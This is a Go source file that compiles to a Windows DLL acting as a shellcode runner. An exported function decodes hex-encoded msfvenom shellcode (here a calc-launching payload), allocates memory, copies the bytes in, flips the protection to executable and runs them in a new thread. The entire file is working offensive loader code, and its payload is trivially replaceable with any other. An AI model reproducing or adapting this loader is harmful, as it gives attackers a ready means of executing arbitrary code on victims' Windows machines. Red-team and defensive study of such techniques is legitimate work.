package main

import "C" // Cgo is required to compile a dll
import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// This code will execute before any other function executes
func init() {
	windows.MessageBox(
		windows.HWND(0),
		windows.StringToUTF16Ptr("Shellcode Runner"),
		windows.StringToUTF16Ptr("After clicking OK the shellcode will run"),
		0x0,
	)
}

// Exported functions should have the following comment right before the function
//
//export shrun
func shrun() {
	//msfvenom  -f hex -p windows/x64/exec cmd=calc
	sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300")

	fmt.Println("[+] Allocating memory for shellcode")
	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		log.Fatalf("[FATAL] VirtualAlloc Failed: %v\n", err)
	}
	fmt.Printf("[+] Allocated Memory Address: 0x%x\n", addr)

	modntdll := syscall.NewLazyDLL("Ntdll.dll")
	procrtlMoveMemory := modntdll.NewProc("RtlMoveMemory")

	procrtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	fmt.Println("[+] Wrote shellcode bytes to destination address")

	fmt.Println("[+] Changing Permissions to RX")
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil {
		log.Fatalf("[FATAL] VirtualProtect Failed: %v", err)
	}

	modKernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateThread := modKernel32.NewProc("CreateThread")
	tHandle, _, lastErr := procCreateThread.Call(
		uintptr(0),
		uintptr(0),
		addr,
		uintptr(0),
		uintptr(0),
		uintptr(0))

	if tHandle == 0 {
		log.Fatalf("Unable to Create Thread: %v\n", lastErr)
	}

	fmt.Printf("[+] Handle of newly created thread:  %x \n", tHandle)
	windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE)
}

// doesn't really do anything but it's needed to compile
func main() {

}
